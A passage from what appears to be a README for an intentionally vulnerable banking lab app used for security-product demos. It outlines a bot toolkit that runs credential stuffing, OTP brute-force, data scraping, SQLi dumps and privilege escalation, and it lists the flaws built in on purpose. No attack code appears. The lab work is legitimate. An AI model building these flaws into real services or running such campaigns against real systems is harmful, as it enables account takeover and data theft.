The suite is re-runnable (it passes on repeated runs); one test is
deliberately skipped (the support expired-token contrast, which can't be shown
black-box — the skip reason explains why).

## Attack & traffic simulation

A bot / traffic toolkit lives in [`nimbusbank-bots/`](nimbusbank-bots/). It
generates both **legitimate** baseline traffic and **attack** traffic that
exercises the intentional gaps — credential stuffing, OTP brute-force,
fake-account farming, BOLA account/card scraping, KYC PII scraping, a one-shot
SQLi dump, `PATCH /me` privilege escalation, and a bounded app-DoS burst — plus
a `run_all.py` campaign that runs them in sequence so the `/ops` console lights
up. Every script maps itself to the vulnerability it drives; see
[`nimbusbank-bots/README.md`](nimbusbank-bots/README.md).

Like the tests, it runs containerized via an opt-in `bots` compose profile (so
it never starts on a normal `docker compose up`) and reaches the gateway as
`http://gateway:80`:

```bash
docker compose up -d                                   # stack must be healthy
docker compose run --rm bots                           # the full campaign
docker compose run --rm bots attacks/account_scraping.py   # a single script
```

Then watch the surge on the Ops console (`http://localhost/ops`) or via
`curl -s http://localhost/api/admin/admin/traffic`. Scraping scripts write
git-ignored CSVs of the stolen data. **Lab-only — never point these at anything
you don't own.**

## Roadmap

1. ~~auth-service: register/login/OTP/JWT+JWKS~~ — done
2. ~~accounts-service: balances, BOLA, mass assignment, SQLi, path traversal, SSRF~~ — done
3. ~~transfers-service: money movement, BOLA, stored XSS, BFLA~~ — done
4. ~~React frontend + Nginx gateway~~ — done
5. ~~**Phase 2:** `kyc-service` (file upload, path-traversal-on-write, KYC
   IDOR download, BFLA compliance queue + PII) and `support-service`
   (ticket IDOR, stored XSS / formjacking in the agent console, inconsistent
   JWT validation / expired-token-accepted), each with a clean
   `/openapi.json`~~ — done. Still to do: the walkthrough of uploading each
   service's `/openapi.json` to F5 XC's API schema validation feature.
6. ~~**Phase 3:** bot scripts against `/login`, `/login/otp/verify`,
   `/register` and the BOLA/BFLA/SQLi endpoints (plain HTTP), similar in spirit
   to VulnCart's `vulncart-bots/`~~ — done, in [`nimbusbank-bots/`](nimbusbank-bots/)
   (legit baseline + attack scripts + a `run_all.py` campaign, runnable via the
   `bots` compose profile).
7. ~~**Phase 4:** a malware/malicious-file-upload demo~~ — done, attached to
   `kyc-service`'s `POST /kyc/upload` (no type/AV check; see the vulnerability
   table).
8. ~~**Phase 5:** client-side defense / formjacking demo against the React
   frontend~~ — done, via the support agent console's raw-HTML render of
   customer-submitted ticket messages.
9. ~~**Phase 6:** an aggregated admin dashboard across all services~~ — done,
   via `cards-service` plus `admin-service`: every service fires fire-and-forget
   request-log events to admin-service's `/ingest`, and the React `/ops` console
   renders a live cross-service traffic view off `GET /admin/traffic` (open,
   LAB-ONLY) with `GET /admin/overview` as the authenticated-but-role-unchecked
   (BFLA) staff variant.
10. ~~**Phase 8:** account-lifecycle flows on auth-service — password reset
    (LAB-ONLY token echo + enumeration + no-throttle + guessable token),
    `PATCH /me` mass-assignment privilege escalation, and change-password with
    no current-password verification, plus the Forgot/Reset/Profile pages in
    the React UI~~ — done. This is the first schema change delivered via the
    new Alembic workflow (added the `password_reset_tokens` table with no data
    loss).
11. **Phase 7:** split across multiple environments for a realistic
    multi-environment F5 XC deployment (e.g. separate XC namespaces for
    auth vs. accounts/transfers).
